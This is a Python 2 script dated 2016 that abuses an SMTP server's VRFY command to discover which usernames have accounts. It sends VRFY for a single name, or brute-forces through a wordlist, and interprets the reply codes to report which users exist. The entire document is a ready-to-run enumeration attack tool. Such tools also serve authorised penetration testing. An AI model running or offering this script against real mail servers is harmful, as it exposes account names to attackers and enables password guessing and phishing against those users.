#!/usr/bin/python
#
# Simple script intended to abuse SMTP server's VRFY command to leak
# usernames having accounts registered within it.
#
# Mariusz Banach, 2016
#

import socket
import sys
import os

# Specify below your default, fallback wordlist
DEFAULT_WORDLIST = '/root/data/fuzzdb/wordlists-user-passwd/names/namelist.txt'
DEFAULT_TIMEOUT = 20

def interpret_smtp_status_code(resp):
    code = int(resp.split(' ')[0])
    messages = {
        250:'Requested mail action okay, completed', 
        251:'User not local; will forward to <forward-path>', 
        252:'Cannot VRFY user, but will accept message and attempt delivery', 
        502:'Command not implemented', 
        530:'Access denied (???a Sendmailism)', 
        550:'Requested action not taken: mailbox unavailable', 
        551:'User not local; please try <forward-path>', 
    }
    
    if code in messages.keys():
        return '({} {})'.format(code, messages[code])
    else:
        return '({} code unknown)'.format(code)

def vrfy(server, username, port, timeout, brute=False):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)

    try:
        conn = s.connect((server, port))
    except socket.error, e:
        print '[!] Connection failed with {}:{} - "{}"'.format(server, port, str(e))
        return False

    try:
        print '[+] Service banner: "{}"'.format(s.recv(1024).strip())
        s.send('HELO test@test.com\r\n')
        print '[>] Response for HELO from {}:{} - '.format(server, port) + s.recv(1024).strip()

    except socket.error, e:
        print '[!] Failed at initial session setup: "{}"'.format(str(e))
        return False
    
    if brute:
        print '[?] Engaging brute-force enumeration...'


    if brute:
        for i in range(len(username)):
            user = username[i]
            s.send('VRFY ' + user + '\r\n')
            res = s.recv(1024).strip()
            print '({}/{}) Server: {}:{} | VRFY {} | Result: [{}]'.format(
                i, len(username), server, port, user, interpret_smtp_status_code(res))
    else:
        s.send('VRFY ' + username + '\r\n')
        res = s.recv(1024).strip()

        print '[>] Response from {}:{} - '.format(server, port) + interpret_smtp_status_code(res)
        if 'User unknown' in res:
            print '[!] User not found.'
        elif (res.startswith('25') and username in res and '<' in res and '>' in res):
            print '[+] User found: "{}"'.format(res.strip())
        else:
            print '[?] Response: "{}"'.format(res.strip())

    s.close()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print '[?] Usage: smtpvrfy.py <smtpserver> [username|wordlist] [timeout]'
        print '\t(to specify a port provide it after a colon \':\' in server parameter)'
        sys.exit(0)

    server = sys.argv[1]
    port = 25 if ':' not in server else int(server[server.find(':')+1:])
    username = sys.argv[2] if len(sys.argv) >= 3 else DEFAULT_WORDLIST
    timeout = DEFAULT_TIMEOUT if len(sys.argv) < 4 else int(sys.argv[3])

    if os.path.isfile(username):
        names = [] 
        with open(username, 'r') as f:
            for a in f:
                names.append(a.strip())
        print '[>] Provided wordlist file with {} entries.'.format(len(names))
        vrfy(server, names, port, timeout, brute=True)
    else:
        vrfy(server, username, port, timeout)
